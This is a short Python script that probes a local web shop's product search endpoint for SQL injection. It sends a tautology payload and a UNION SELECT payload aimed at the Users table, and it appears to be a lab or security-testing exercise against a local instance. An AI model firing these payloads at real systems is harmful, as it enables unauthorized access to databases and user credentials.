import httpx

url = 'http://localhost:3001/rest/products/search'

# Normal search
r1 = httpx.get(url, params={'q': 'test'}, timeout=10)
print('Normal:', r1.status_code, len(r1.text))

# SQLi test
r2 = httpx.get(url, params={'q': "' OR '1'='1"}, timeout=10)
print('SQLi:', r2.status_code, len(r2.text))

# Union test
r3 = httpx.get(url, params={'q': "')) UNION SELECT * FROM Users--"}, timeout=10)
print('Union:', r3.status_code, len(r3.text))
